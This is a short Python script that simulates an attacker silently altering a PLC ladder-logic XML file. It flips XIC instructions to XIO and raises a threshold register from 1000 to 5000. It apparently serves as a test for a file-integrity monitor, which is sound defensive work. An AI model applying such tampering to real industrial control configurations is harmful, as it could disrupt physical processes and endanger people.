import os
import time

def inject_malicious_logic(file_path: str):
    """
    Simulates an attacker changing a logic block from normally open (XIC) to normally closed (XIO)
    """
    if not os.path.exists(file_path):
        print(f"[!] Target file {file_path} not found.")
        return

    with open(file_path, "r") as f:
        content = f.read()

    print("[*] Injecting silent ladder logic change...")
    
    # Simple simulation: change an Examine If Closed to Examine If Open
    altered_content = content.replace(
        '<Instruction Name="XIC"', 
        '<Instruction Name="XIO"'
    )
    
    # Change a threshold register
    altered_content = altered_content.replace(
        '<Data Value="1000"/>',
        '<Data Value="5000"/>'
    )

    with open(file_path, "w") as f:
        f.write(altered_content)
        
    print("[+] Attack successful. Logic modified.")

if __name__ == "__main__":
    target = os.environ.get("WATCH_DIR", "/app/plc_config") + "/active.xml"
    # Delay to ensure monitor is running if started simultaneously
    time.sleep(1)
    inject_malicious_logic(target)
